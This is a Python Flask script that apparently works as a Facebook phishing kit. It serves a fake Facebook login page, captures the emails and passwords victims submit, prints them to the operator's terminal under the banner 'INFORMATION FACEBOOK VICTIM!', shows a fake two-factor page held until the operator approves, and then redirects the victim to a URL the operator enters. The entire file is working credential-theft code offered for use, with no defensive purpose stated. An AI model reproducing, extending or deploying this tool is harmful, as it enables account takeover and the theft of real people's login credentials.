from flask import Flask, render_template, request, redirect, jsonify
import threading
import logging
from logging import StreamHandler
import sys
import os
from art import text2art
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)

# Define the default redirect URL
default_redirect_url = 'http://example.com'

# Define a variable to store the redirect URL
redirect_url = default_redirect_url
auth_approved = threading.Event()  # Event to handle the 2FA approval
login_entries = []  # List to store login details

def display_name():
    """Display the user's name in blue using the art library with 'small' font."""
    print(Fore.BLUE + text2art("M0HVARA", font='slant'))
    print(Fore.LIGHTYELLOW_EX + "=" * 80)
    print(Fore.LIGHTYELLOW_EX + "| " + "Codec By M0HVARA === www.facebook.com/mohvara".center(76) + " |")
    print(Fore.LIGHTYELLOW_EX + "=" * 80)
    print(" ")
    print(Fore.RED + Style.BRIGHT + "\u2554" + "\u2550" * 77 + "\u2557")
    print(Fore.RED + Style.BRIGHT + "\u2551" + f' INFORMATION FACEBOOK VICTIM! '.center(77) + "\u2551")
    print(Fore.RED + Style.BRIGHT + "\u255A" + "\u2550" * 77 + "\u255D")
    print("\n")

@app.route('/')
def login():
    return render_template('login_facebook.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')

    # Redirect stdout to null to suppress unwanted terminal output
    sys.stdout = open(os.devnull, 'w')

    # Print the submitted data to the terminal with color
    try:
        print(f"\033[1;32m\nSubmitted Data:\n{'-'*30}\nEmail: \033[1;34m{email}\nPassword: \033[1;34m{password}\n{'-'*30}\033[0m\n")
        # Add the login details to the list
        login_entries.append((email, password))

        # Display the login entries table in the terminal
        table = generate_login_table(login_entries)
        sys.stdout = sys.__stdout__  # Reset stdout to default
        print(table)  # Print the table to the terminal

    except UnicodeEncodeError:
        sys.stdout = sys.__stdout__  # Reset stdout to default
        print("UnicodeEncodeError: Unable to display table with the current encoding.")

    # Redirect to the 2FA page
    return redirect('/auth')

@app.route('/auth')
def auth_page():
    # Render the 2FA page and start waiting for terminal approval
    threading.Thread(target=wait_for_2fa).start()
    return render_template('auth_facebook.html')

def wait_for_2fa():
    auth_code = input("\nEnter 'y' to approve: ").strip().lower()
    if auth_code == 'y':
        print("Authentication successful. Redirecting the user...")
        auth_approved.set()  # Signal the Flask app to continue

@app.route('/check_approval')
def check_approval():
    if auth_approved.is_set():
        return jsonify(redirect_url)  # Return the redirect URL in JSON format
    return jsonify("pending")  # Return "pending" if not yet approved

def generate_login_table(entries):
    """Create a table string for displaying login details."""
    try:
        table = "\033[1;32m" + "\n" + "╔═════════════════════════════════════════════════════════════╗" + "\n"
        table += "\033[1;32m" + "║ Email                        │ Password                     ║" + "\n"
        table += "\033[1;32m" + "╠──────────────────────────────┼──────────────────────────────╣" + "\n"

        for entry in entries:
            email, password = entry
            table += "\033[1;32m" + f'║ {email.ljust(28)} │ {password.ljust(28)} ║' + "\n"

        table += "\033[1;32m" + "╚══════════════════════════════╩══════════════════════════════╝" + "\n"
        return table

    except UnicodeEncodeError:
        return "Unable to generate table due to encoding issues."

if __name__ == '__main__':
    # Display the user's name at startup
    display_name()

    # Prompt for the redirect URL
    redirect_url = input(Fore.CYAN + "Enter the redirect URL: " + Style.RESET_ALL).strip()

    # Set logging to suppress Flask's default output
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)  # Set to ERROR to suppress most messages
    handler = StreamHandler()
    handler.setLevel(logging.ERROR)
    log.addHandler(handler)

    # Start the Flask app
    app.run(debug=False, use_reloader=False, host='0.0.0.0', port=5000)
